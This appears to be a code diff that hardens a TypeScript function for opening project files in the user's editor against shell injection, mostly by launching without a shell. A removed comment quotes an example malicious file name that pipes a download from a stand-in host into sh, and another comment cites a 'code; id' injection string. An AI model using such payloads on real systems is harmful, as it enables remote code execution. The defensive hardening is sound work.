@@ -45,17 +45,61 @@ export async function saveTextFile(
   return result.filePath;
 }
 
-// Opens a project file with the user's editor command (e.g. "code"). The path must be inside the project, and is
-// passed as a single quoted argument.
+// Splits a command line into words like a shell would for plain words: whitespace separates, single or double quotes
+// group. There is no expansion, no escapes and no operators, so `code; id` is the program `code;` with the argument `id`.
+export function splitCommand(command: string): string[] {
+  const words: string[] = [];
+  let word = '';
+  let inWord = false;
+  let quote: string | null = null;
+  for (const char of command) {
+    if (quote) {
+      if (char === quote) quote = null;
+      else word += char;
+    } else if (char === '"' || char === "'") {
+      quote = char;
+      inWord = true;
+    } else if (/\s/.test(char)) {
+      if (inWord) words.push(word);
+      word = '';
+      inWord = false;
+    } else {
+      word += char;
+      inWord = true;
+    }
+  }
+  if (quote) throw new Error('The editor command has an unclosed quote.');
+  if (inWord) words.push(word);
+  return words;
+}
+
+// Opens a project file with the user's editor command (e.g. "code --reuse-window"). The path must be inside the
+// project. The command is split into a program and arguments and started without a shell.
 export function openInEditor(editorCommand: string, projectRoot: string, path: string): void {
   const file = new Workspace(projectRoot).resolve(path);
-  // The path is a single double-quoted argument. On macOS and Linux the shell still expands `$(...)`, `$VAR` and
-  // backticks inside double quotes (a file named "$(curl evil|sh).js" would run it), and a backslash could end the
-  // quotes; cmd.exe on Windows only expands %VAR% there, which runs nothing.
-  const unsafe = process.platform === 'win32' ? /["\r\n]/ : /["\r\n$`\\]/;
+  const windows = process.platform === 'win32';
+  // A quote or line break in the path is refused everywhere; cmd.exe on Windows only expands %VAR% inside double
+  // quotes, which runs nothing. The other characters stay refused on macOS and Linux as before.
+  const unsafe = windows ? /["\r\n]/ : /["\r\n$`\\]/;
   if (unsafe.test(file)) throw new Error('Unsupported characters in file path.');
-  const command = editorCommand.trim() || 'code';
-  const child = spawn(`${command} "${file}"`, { shell: true, detached: true, stdio: 'ignore', windowsHide: true });
+  const [program, ...args] = splitCommand(editorCommand.trim() || 'code');
+  if (!program) throw new Error('The editor command is empty.');
+  const options = { detached: true, stdio: 'ignore', windowsHide: true } as const;
+  let child;
+  if (windows) {
+    // Launchers such as code.cmd cannot be started without cmd.exe (Node.js refuses .cmd files without a shell), so
+    // cmd.exe runs one quoted program and its quoted arguments. Its own operators cannot appear inside the quotes.
+    const words = [program, ...args, file];
+    if (words.some((word) => /["&|<>^%\r\n]/.test(word) && word !== file)) {
+      throw new Error('Unsupported characters in the editor command.');
+    }
+    child = spawn('cmd.exe', ['/d', '/s', '/c', `"${words.map((word) => `"${word}"`).join(' ')}"`], {
+      ...options,
+      windowsVerbatimArguments: true,
+    });
+  } else {
+    child = spawn(program, [...args, file], options);
+  }
   child.on('error', () => {});
   child.unref();
 }
